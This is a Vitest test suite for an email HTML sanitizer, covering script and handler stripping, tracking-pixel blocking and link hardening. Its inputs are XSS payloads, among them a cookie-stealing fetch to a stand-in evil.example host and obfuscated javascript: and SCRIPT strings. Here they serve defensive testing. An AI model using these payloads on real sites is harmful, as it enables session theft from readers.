import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "./sanitize.js";

/**
 * The sanitizer, exercised with the payloads that actually appear in mail.
 *
 * Two distinct threats, tested separately:
 *   - execution (anything that runs in the reader's browser);
 *   - disclosure (anything that phones home when the message is opened, which is
 *     the far more common one — every marketing email carries a pixel).
 *
 * The iframe in the web app is the second layer. Everything asserted here must
 * hold without it, because "we also have a sandbox" is not a reason to ship a
 * sanitizer that leaks.
 */

function clean(html: string): string {
  return sanitizeEmailHtml(html)?.html ?? "";
}

function blocked(html: string): number {
  return sanitizeEmailHtml(html)?.blockedRemoteImages ?? 0;
}

describe("execution surfaces", () => {
  it("removes script tags and their contents", () => {
    const out = clean(
      '<p>hi</p><script>fetch("https://evil.example?c="+document.cookie)</script>',
    );

    expect(out).toContain("hi");
    expect(out).not.toMatch(/<script/i);
    // The code must not survive as visible text either.
    expect(out).not.toContain("document.cookie");
  });

  it("removes event handler attributes", () => {
    const out = clean(
      '<div onclick="alert(1)" onmouseover="alert(2)" onerror="alert(3)">x</div>',
    );

    expect(out).not.toMatch(/onclick|onmouseover|onerror/i);
    expect(out).toContain("x");
  });

  it("removes javascript: hrefs", () => {
    const out = clean('<a href="javascript:alert(1)">click</a>');

    expect(out).not.toMatch(/javascript:/i);
    expect(out).toContain("click");
  });

  it.each([
    ['<iframe src="https://evil.example"></iframe>', /<iframe/i],
    ['<object data="x.swf"></object>', /<object/i],
    ['<embed src="x.swf">', /<embed/i],
    ['<form action="https://evil.example"><input name="p"></form>', /<form|<input/i],
    ['<base href="https://evil.example/">', /<base/i],
    ['<link rel="stylesheet" href="https://evil.example/x.css">', /<link/i],
    ['<meta http-equiv="refresh" content="0;url=https://evil.example">', /<meta/i],
  ])("removes %s", (input, forbidden) => {
    expect(clean(input)).not.toMatch(forbidden);
  });

  it("removes svg, a favourite script vector", () => {
    const out = clean(
      '<svg><script>alert(1)</script><animate onbegin="alert(2)"/></svg>',
    );

    expect(out).not.toMatch(/<svg|<script|onbegin/i);
  });

  it("strips a style block instead of printing its CSS as text", () => {
    // The tag must go, and its contents must not reappear as body text — which is
    // what a naive allowlist plus KEEP_CONTENT does.
    const out = clean(
      "<style>body{background:url(https://evil.example/p.gif)}</style><p>hi</p>",
    );

    expect(out).not.toMatch(/<style/i);
    expect(out).not.toContain("evil.example");
    expect(out).toContain("hi");
  });

  it("keeps the text of a disallowed wrapper but not the wrapper", () => {
    const out = clean("<marquee>important notice</marquee>");

    expect(out).not.toMatch(/<marquee/i);
    expect(out).toContain("important notice");
  });

  it("survives the classic parser-confusion payloads", () => {
    for (const payload of [
      "<img src=x onerror=alert(1)>",
      '<a href="jAvAsCrIpT:alert(1)">x</a>',
      '<a href="java&#115;cript:alert(1)">x</a>',
      '<div style="background:url(javascript:alert(1))">x</div>',
      "<<SCRIPT>alert(1);//<</SCRIPT>",
      '<img src="1" onerror="alert(1)" />',
    ]) {
      const out = clean(payload);
      expect(out).not.toMatch(/onerror|javascript:|<script/i);
    }
  });
});

describe("remote content, the tracking-pixel problem", () => {
  it("defuses a remote image and counts it", () => {
    const result = sanitizeEmailHtml(
      '<img src="https://track.example/pixel.gif?uid=abc" width="1" height="1">',
    );

    expect(result?.blockedRemoteImages).toBe(1);
    // Not loadable, but not lost: click-to-load needs the URL.
    expect(result?.html).not.toMatch(/\ssrc=/);
    expect(result?.html).toContain(
      'data-blocked-src="https://track.example/pixel.gif?uid=abc"',
    );
  });

  it("defuses protocol-relative sources", () => {
    // `//host/x` inherits the page's scheme and is every bit as remote.
    const result = sanitizeEmailHtml('<img src="//track.example/p.gif">');

    expect(result?.blockedRemoteImages).toBe(1);
    expect(result?.html).toContain("data-blocked-src");
  });

  it("defuses srcset, background and poster too", () => {
    const result = sanitizeEmailHtml(
      '<img srcset="https://a.example/1x.png 1x"><td background="https://b.example/bg.png">x</td>',
    );

    expect(result?.html).toContain("data-blocked-srcset");
    expect(result?.html).not.toMatch(/\ssrcset=/);
    expect(result?.html).not.toMatch(/\sbackground=/);
  });

  it("blocks remote urls inside inline styles", () => {
    const result = sanitizeEmailHtml(
      '<div style="background-image:url(https://track.example/p.gif); color:red">x</div>',
    );

    expect(result?.html).not.toContain("track.example");
    expect(result?.html).toContain("color:red");
    expect(result?.blockedRemoteImages).toBe(1);
  });

  it("leaves data: images alone", () => {
    // Self-contained: nothing is fetched, so nothing is disclosed.
    const pixel = "data:image/png;base64,iVBORw0KGgo=";
    const result = sanitizeEmailHtml(`<img src="${pixel}">`);

    expect(result?.html).toContain(`src="${pixel}"`);
    expect(result?.blockedRemoteImages).toBe(0);
  });

  it("leaves cid: images alone", () => {
    // A reference to an attachment of this same message — already in our hands.
    const result = sanitizeEmailHtml('<img src="cid:logo@example">');

    expect(result?.html).toContain('src="cid:logo@example"');
    expect(result?.blockedRemoteImages).toBe(0);
  });

  it("counts every blocked image in a marketing email", () => {
    const result = sanitizeEmailHtml(`
      <table><tr><td background="https://cdn.example/bg.png">
        <img src="https://cdn.example/logo.png">
        <img src="https://cdn.example/hero.jpg">
        <img src="https://track.example/open.gif?id=1" width="1" height="1">
      </td></tr></table>`);

    // Three images; the td background is defused too but is not an <img>.
    expect(result?.blockedRemoteImages).toBe(3);
    // Nothing remote is loadable: no src/background attribute survives at all.
    expect(result?.html).not.toMatch(/\ssrc="https?:/);
    expect(result?.html).not.toMatch(/\sbackground=/);
    expect(result?.html).toContain("data-blocked-background");
  });
});

describe("links", () => {
  it("keeps http links but neuters the window handle", () => {
    const out = clean('<a href="https://example.com/x">read</a>');

    expect(out).toContain('href="https://example.com/x"');
    expect(out).toContain('target="_blank"');
    expect(out).toContain("noopener");
    expect(out).toContain("noreferrer");
  });

  it("overrides a sender-supplied target and rel", () => {
    // A link that could target a named frame, or leak a referrer, is the sender's
    // choice to make — and it is not theirs to make.
    const out = clean('<a href="https://example.com" target="_top" rel="opener">x</a>');

    expect(out).not.toContain("_top");
    expect(out).not.toMatch(/rel="opener"/);
    expect(out).toContain('target="_blank"');
  });

  it("keeps mailto and tel", () => {
    expect(clean('<a href="mailto:a@b.example">mail</a>')).toContain(
      "mailto:a@b.example",
    );
    expect(clean('<a href="tel:+21612345678">call</a>')).toContain("tel:+216");
  });
});

describe("ordinary mail still renders", () => {
  it("keeps the table soup email actually uses", () => {
    const out = clean(`
      <table cellpadding="0" cellspacing="0" width="600" bgcolor="#ffffff">
        <tr><td align="center" style="font-family:Arial; font-size:14px">
          <h1>Invoice 4471</h1>
          <p>Hello <strong>Dana</strong>,<br>Your invoice is <em>attached</em>.</p>
          <ul><li>12 licences</li><li>Net 30</li></ul>
        </td></tr>
      </table>`);

    expect(out).toContain("<table");
    expect(out).toContain('bgcolor="#ffffff"');
    expect(out).toContain("font-family:Arial");
    expect(out).toContain("<strong>Dana</strong>");
    expect(out).toContain("<li>12 licences</li>");
  });

  it("preserves non-ASCII content", () => {
    const out = clean("<p>Vous avez partagé certaines données — merci&nbsp;!</p>");
    expect(out).toContain("partagé");
    expect(out).toContain("données");
  });
});

describe("edge cases", () => {
  it("returns null for nothing to sanitize", () => {
    expect(sanitizeEmailHtml(null)).toBeNull();
    expect(sanitizeEmailHtml("")).toBeNull();
    expect(sanitizeEmailHtml("   \n  ")).toBeNull();
  });

  it("does not leak its hook into the next call", () => {
    /*
     * DOMPurify's hook registry is module-global. A hook left registered would run
     * on every later sanitize in the process, so the count from one message could
     * bleed into another's.
     */
    expect(
      sanitizeEmailHtml('<img src="https://a.example/1.png">')?.blockedRemoteImages,
    ).toBe(1);
    expect(sanitizeEmailHtml("<p>no images here</p>")?.blockedRemoteImages).toBe(0);
    expect(
      sanitizeEmailHtml('<img src="https://b.example/2.png">')?.blockedRemoteImages,
    ).toBe(1);
  });

  it("strips a sender-supplied data-blocked-src", () => {
    /*
     * Only the hook may create these, and it runs after attribute filtering. A
     * sender who plants one would otherwise be handing click-to-load a URL of
     * their choosing — and inflating the "N images blocked" count with it.
     */
    const result = sanitizeEmailHtml(
      '<img data-blocked-src="https://evil.example/p.gif">',
    );

    expect(result?.html).not.toContain("evil.example");
    expect(result?.blockedRemoteImages).toBe(0);
  });

  it("is lossy on a second pass, which is why bodies are sanitized once", () => {
    // A consequence of the rule above: re-sanitizing drops the stashed URLs. The
    // API sanitizes stored raw HTML on read and never re-sanitizes its own output.
    const once = clean('<img src="https://a.example/1.png">');
    expect(once).toContain("data-blocked-src");
    expect(clean(once)).not.toContain("data-blocked-src");
  });

  it("handles a body that is only a tracking pixel", () => {
    expect(blocked('<img src="https://track.example/p.gif">')).toBe(1);
  });
});
